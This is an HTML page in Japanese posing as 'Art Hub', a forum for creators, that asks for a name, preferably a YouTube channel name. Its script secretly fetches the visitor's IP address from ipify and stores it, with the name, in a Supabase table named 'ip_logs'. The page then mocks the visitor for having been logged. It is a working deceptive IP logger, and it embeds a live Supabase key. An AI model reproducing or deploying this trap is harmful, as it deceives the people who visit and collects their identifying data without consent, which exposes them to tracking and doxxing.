<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>クリエイターに特化したフォーラム・掲示板</title>
  <style>
    /* ===== 全体レイアウト ===== */
    body {
      margin: 0;
      font-family: 'Inter', 'Segoe UI', sans-serif;
      background: radial-gradient(circle at top left, #1a1a1a, #0d0d0d 70%);
      color: #f0f0f0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .container {
      background: linear-gradient(145deg, #1f1f1f, #121212);
      border-radius: 20px;
      padding: 40px;
      width: 400px;
      text-align: center;
      box-shadow: 0 0 30px rgba(0, 255, 200, 0.15);
    }

    h1 {
      font-size: 2rem;
      margin-bottom: 20px;
      color: #fff;
    }

    label {
      display: block;
      margin-bottom: 10px;
      font-size: 0.95rem;
      font-weight: 600;
      color: #aaa;
    }

    input {
      width: 100%;
      padding: 12px;
      border-radius: 10px;
      border: none;
      outline: none;
      background: #1a1a1a;
      color: #fff;
      font-size: 1rem;
      box-shadow: inset 0 0 5px rgba(0, 255, 200, 0.2);
      margin-bottom: 20px;
      transition: all 0.3s ease;
    }

    input:focus {
      box-shadow: 0 0 10px rgba(0, 255, 200, 0.5);
    }

    button {
      width: 100%;
      padding: 14px;
      background: linear-gradient(135deg, #00ffc6, #00aaff);
      border: none;
      border-radius: 12px;
      color: #000;
      font-weight: bold;
      font-size: 1rem;
      cursor: pointer;
      transition: transform 0.2s ease, box-shadow 0.3s ease;
    }

    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 10px 20px rgba(0, 255, 200, 0.3);
    }

    #status {
      margin-top: 20px;
      font-size: 0.95rem;
      color: #00ffc6;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Art Hub</h1>

    <label for="name">クリエイターに特化したフォーラム・掲示板</label>
    <input type="text" id="name" placeholder="名前を入力（YTチャンネル名推奨）">
    <button id="log-btn">保存</button>

    <p id="status">保存が完了したら使えます</p>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
  <script>
    const SUPABASE_URL = "https://qeydytpzcgucerzjocql.supabase.co";
    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFleWR5dHB6Y2d1Y2VyempvY3FsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTc0Mjg3MTIsImV4cCI6MjA3MzAwNDcxMn0.Ikh2yM20YhpLyB1Th7SsW0m66o3JO8ANeLQlxR8ZWXE";

    const supabaseClient = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

    async function logIPAddressAndName() {
      const name = document.getElementById('name').value.trim();
      if (!name) {
        alert('名前を入力してください');
        return;
      }

      try {
        const response = await fetch("https://api.ipify.org?format=json");
        const data = await response.json();
        const ip = data.ip;

        const { error } = await supabaseClient.from("ip_logs").insert([
          { ip_address: ip, user_name: name }
        ]);

        if (error) {
          console.error("保存に失敗:", error);
          document.getElementById("status").innerText = "保存に失敗しました。";
        } else {
          document.getElementById("status").innerText = `あなたのIPアドレス ${ip} と名前「${name}」を保存しました（笑）じゃあね！`;
        }
      } catch (err) {
        console.error("エラー:", err);
        document.getElementById("status").innerText = "保存に失敗しました。";
      }
    }

    document.getElementById('log-btn').addEventListener('click', logIPAddressAndName);
  </script>
</body>
</html>
